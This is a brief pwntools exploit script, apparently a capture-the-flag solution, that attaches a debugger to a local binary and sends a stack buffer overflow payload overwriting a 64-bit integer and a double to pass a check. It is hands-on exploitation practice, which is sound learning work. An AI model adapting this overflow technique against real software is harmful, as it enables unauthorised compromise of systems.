from pwn import *
import struct
#/proc/sys/kernel/randomize_va_space
context.terminal=['tmux','splitw','-h']
p = process("gettingStart")
v7 = 0x7FFFFFFFFFFFFFFF
v8 = 0.1
code_base = 0x555555554000
gdb.attach(p,"b *0x555555554A36")
b1 = code_base + 0x0000000000000A36
b2 = code_base + 0x0000000000000A6F
def debug():
	gdb.attach(p,"b *{b1}\nb *{b2}".format(b1=hex(b1),b2=hex(b2)))
payload = 0x18*"a" + struct.pack("<q",v7) + struct.pack("<d",v8)
p.sendafter("on you.",payload)
p.interactive()
